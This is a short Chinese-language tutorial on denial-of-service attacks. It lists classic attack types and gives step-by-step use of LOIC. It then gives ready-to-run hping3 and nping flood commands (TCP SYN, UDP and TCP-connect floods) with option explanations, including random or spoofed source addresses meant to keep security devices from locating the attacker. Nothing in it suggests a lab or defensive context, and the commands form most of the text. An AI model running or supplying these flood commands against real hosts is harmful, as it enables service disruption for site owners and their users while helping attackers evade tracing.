DOS攻击

    1. 网络安全之DOS攻击
      <i class="fa fa-external-link-alt"></i>

  • 攻击分类：主要有Land攻击、死亡之ping、泪滴、Smurf攻击及SYN洪水等

  • 使用LOIC(卢瓦、低轨道粒子炮)攻击

  • 选择URL或IP；

  • 设置攻击模式(HTTP,UDP,TCP)、端口号(PORT)、线程(Threads)、速度(可拉)

  • 启动攻击（点击IMMA CHARGIN MAH LAZER）

    1. 使用hping3(kali)进行DOS攻击
  • -c：发送数据包的个数
  • -d：每个数据包的大小
  • -S：发送SYN数据包
  • -w：TCP window大小
  • -p：目标端口，你可以指定任意端口
  • –flood：尽可能快的发送数据包
  • –rand-source：使用随机的IP地址，使得安全设备不能定位实际IP；
  • -a或–spoof：隐藏主机名
  • com：目的IP地址或网站
# TCP攻击
$ hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source ip/域名

# SYN Flood 攻击
$ hping3 -S --flood -V testsite.com

# UDP Flood
$ hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2  	-s:指定源端口，不指定也可以
    1. 使用Nping3(kali)进行DOS攻击
$ nping --tcp-connect --rate=10000 -c 1000000000 -q 192.168.33.135
--tcp-connect：建立tcp连接 --rate=10000：速率一万个

# 使用nping实现TCP连接攻击
$ nping --tcp-connect -rate=90000 -c 900000 -q ip/域名
